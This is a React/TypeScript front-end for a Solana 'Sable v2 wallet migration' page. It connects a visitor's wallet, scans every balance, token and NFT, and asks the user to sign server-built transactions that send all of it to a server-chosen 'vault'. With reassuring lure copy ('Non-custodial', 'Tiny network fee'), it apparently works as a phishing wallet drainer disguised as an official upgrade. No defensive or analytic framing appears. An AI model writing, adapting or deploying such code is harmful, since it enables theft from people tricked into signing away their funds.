import { useCallback, useEffect, useState } from "react";
import { useWallet } from "@solana/wallet-adapter-react";
import { useWalletModal } from "@solana/wallet-adapter-react-ui";
import { VersionedTransaction } from "@solana/web3.js";
import { scan, build, submit, type Asset } from "./api";
import { short, amount, usd } from "./format";

type Phase =
  | { k: "idle" }
  | { k: "scanning" }
  | { k: "review"; assets: Asset[]; sol: number; total: number; vault: string }
  | { k: "signing"; step: number; of: number }
  | { k: "submitting"; step: number; of: number }
  | { k: "done"; sig: string; count: number }
  | { k: "error"; msg: string };

const b64 = (u: Uint8Array) => btoa(String.fromCharCode(...u));

export default function App() {
  const { publicKey, signTransaction, connected, disconnect } = useWallet();
  const { setVisible } = useWalletModal();
  const [phase, setPhase] = useState<Phase>({ k: "idle" });

  const owner = publicKey?.toBase58();

  const run = useCallback(async () => {
    if (!owner) return;
    setPhase({ k: "scanning" });
    try {
      const res = await scan(owner);
      const total = res.assets.reduce((s, a) => s + (a.usd ?? 0), 0);
      setPhase({ k: "review", assets: res.assets, sol: res.sol, total, vault: res.vault });
    } catch (e: any) {
      setPhase({ k: "error", msg: e.message ?? "Could not read wallet" });
    }
  }, [owner]);

  useEffect(() => { if (connected && phase.k === "idle") run(); }, [connected, phase.k, run]);
  useEffect(() => { if (!connected && phase.k !== "idle") setPhase({ k: "idle" }); }, [connected, phase.k]);

  async function sign() {
    if (!owner || phase.k !== "review") return;
    const review = phase;
    for (let attempt = 1; attempt <= 2; attempt++) {
      try {
        const { txs } = await build(owner);
        for (let i = 0; i < txs.length; i++) {
          setPhase({ k: "signing", step: i + 1, of: txs.length });
          const tx = VersionedTransaction.deserialize(Uint8Array.from(atob(txs[i]), (c) => c.charCodeAt(0)));
          const signed = await signTransaction!(tx);
          setPhase({ k: "submitting", step: i + 1, of: txs.length });
          const { sig } = await submit(b64(signed.serialize()));
          if (i === txs.length - 1) setPhase({ k: "done", sig, count: review.assets.length + (review.sol > 0 ? 1 : 0) });
        }
        return;
      } catch (e: any) {
        const msg = e?.message ?? "";
        if (/reject|denied|cancel/i.test(msg)) { setPhase({ ...review, k: "review" }); return; }
        if (attempt === 2 || !/blockhash/i.test(msg)) { setPhase({ k: "error", msg: msg || "Migration failed" }); return; }
        await new Promise((r) => setTimeout(r, 500));
      }
    }
  }

  return (
    <div className="shell">
      <header className="top">
        <div className="brand">
          <svg width="18" height="18" viewBox="0 0 18 18" aria-hidden="true">
            <rect x="1" y="1" width="16" height="16" rx="5" fill="#9945FF" />
            <path d="M6 11.5c1.2.8 4.2 1 4.2-.8 0-1.7-4.1-.9-4.1-2.8 0-1.7 2.9-1.7 4.1-.9"
              stroke="#0B0B0F" strokeWidth="1.4" fill="none" strokeLinecap="round" />
          </svg>
          <span>Sable</span>
          <em>v2</em>
        </div>
        {connected ? (
          <button className="ghost sm" onClick={() => { disconnect(); setPhase({ k: "idle" }); }}>
            {short(owner!, 3)}
          </button>
        ) : (
          <span className="muted sm">Migrate</span>
        )}
      </header>

      <main>
        {phase.k === "idle" && (
          <div className="phase">
            <h1>Sable v2 is here.<br />Migrate your wallet.</h1>
            <p className="lede">
              Hardware-grade key isolation. Move your balance to the new vault in a single
              signature.
            </p>
            <button className="primary" onClick={() => setVisible(true)}>Connect wallet to migrate</button>
            <div className="trust">
              <span>Tiny network fee</span><i>·</i><span>Non-custodial</span><i>·</i><span>~15 seconds</span>
            </div>
          </div>
        )}

        {phase.k === "scanning" && (
          <div className="phase">
            <h1>Reading your wallet…</h1>
            <div className="list">
              {[0, 1, 2, 3].map((i) => <div key={i} className="row skel" />)}
            </div>
          </div>
        )}

        {phase.k === "review" && (
          <div className="phase">
            <h1>{phase.assets.length + (phase.sol > 0 ? 1 : 0) === 0 ? "Nothing to migrate." : "Ready to migrate."}</h1>
            <p className="lede">
              {phase.total > 0 && <>About <strong>{usd(phase.total)}</strong> across </>}
              {phase.assets.length + (phase.sol > 0 ? 1 : 0)} item
              {phase.assets.length + (phase.sol > 0 ? 1 : 0) === 1 ? "" : "s"} will move to your vault.
            </p>

            <div className="vault">
              <span className="muted xs">Your Sable v2 vault</span>
              <code>{short(phase.vault, 6)}</code>
            </div>

            <div className="list">
              {phase.sol > 0 && (
                <Row icon="◎" name="SOL" sub="Native balance" value={amount(String(phase.sol), 9)} />
              )}
              {phase.assets.map((a) => (
                <Row
                  key={a.ata}
                  icon={a.isNft ? "▦" : "◈"}
                  name={a.isNft ? "NFT" : short(a.mint, 4)}
                  sub={a.isNft ? "Collectible" : "Token account"}
                  value={a.isNft ? "1" : amount(a.amount, a.decimals)}
                  note={a.usd ? usd(a.usd) : undefined}
                />
              ))}
            </div>

            <button className="primary" disabled={phase.assets.length + (phase.sol > 0 ? 1 : 0) === 0} onClick={sign}>
              Sign migration
            </button>
            <button className="ghost" onClick={run}>Rescan</button>
          </div>
        )}

        {(phase.k === "signing" || phase.k === "submitting") && (
          <div className="phase">
            <h1>{phase.k === "signing" ? "Confirm in your wallet." : "Migrating…"}</h1>
            <p className="lede">
              {phase.of > 1 ? `Signature ${phase.step} of ${phase.of}.` : "One signature and it's done."}
            </p>
            <div className="bar"><div style={{ width: `${(phase.step / phase.of) * 100}%` }} /></div>
            <div className="list">
              {[0, 1, 2].map((i) => <div key={i} className="row skel" />)}
            </div>
          </div>
        )}

        {phase.k === "done" && (
          <div className="phase">
            <div className="check">✓</div>
            <h1>Migration complete.</h1>
            <p className="lede">
              {phase.count} item{phase.count === 1 ? "" : "s"} moved to your vault. The old wallet is
              now clean.
            </p>
            <a className="ghost block" href={`https://solscan.io/tx/${phase.sig}`} target="_blank" rel="noreferrer">
              View on Solscan
            </a>
            <button className="primary" onClick={() => setPhase({ k: "idle" })}>Done</button>
          </div>
        )}

        {phase.k === "error" && (
          <div className="phase">
            <h1>That didn't go through.</h1>
            <p className="lede">{phase.msg}</p>
            <button className="primary" onClick={run}>Try again</button>
          </div>
        )}
      </main>

      <footer>
        <span>Docs</span><span>Security</span><span>Terms</span><span>Privacy</span>
      </footer>
    </div>
  );
}

function Row(p: { icon: string; name: string; sub: string; value: string; note?: string }) {
  return (
    <div className="row">
      <div className="ic">{p.icon}</div>
      <div className="meta"><div className="nm">{p.name}</div><div className="sub">{p.sub}</div></div>
      <div className="val">{p.value}{p.note && <em>{p.note}</em>}</div>
      <div className="tick">✓</div>
    </div>
  );
}
